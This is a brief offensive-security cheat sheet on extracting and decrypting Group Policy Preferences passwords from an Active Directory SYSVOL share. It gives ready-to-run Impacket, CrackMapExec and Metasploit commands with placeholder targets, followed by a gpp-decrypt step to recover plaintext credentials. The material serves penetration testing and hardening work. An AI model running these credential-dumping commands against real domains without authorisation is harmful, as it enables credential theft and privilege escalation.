**GPP passwords** — recover passwords that admins embedded in Group Policy Preferences (GPP), a legacy way to push a local-admin or service account out to every machine. Any domain user can read them because they sit as XML in the DC's SYSVOL share (the domain-wide folder every machine reads policy from), encrypted with AES256 using a **single key that Microsoft published** in its own documentation. So you just grab the `cpassword` value and decrypt it offline with `gpp-decrypt`, often escalating straight away.

## Discovery

**Method 1: Manual** - browse a DC's `SYSVOL` share for XML files with a non-empty `cpassword="..."` attribute.

**Method 2: Impacket**

```bash

Get-GPPPassword.py 'DOMAIN/USER_NAME:USER_PASS@DC_IP'

```

**Method 3: CrackMapExec**

```bash

cme smb DC_IP -u 'USER_NAME' -p 'USER_PASS' -M gpp_password
cme smb DC_IP -u 'USER_NAME' -p 'USER_PASS' -M gpp_autologin

```

**Method 4: Metasploit**

```txt

use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS DC_IP
set SMBDomain DOMAIN
set SMBUser USER_NAME
set SMBPass USER_PASS
run

```

## Exploitation

Decode the `cpassword` blob (Kali ships `gpp-decrypt`):

```bash

gpp-decrypt BASE64

```

## Caution

**Warning:** You should not find GPP credentials on a recent AD. If you do, it might be a honeypot.

## References

- Impacket - https://github.com/fortra/impacket
- CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
- The Hacker Recipes - GPP - https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policies-preferences
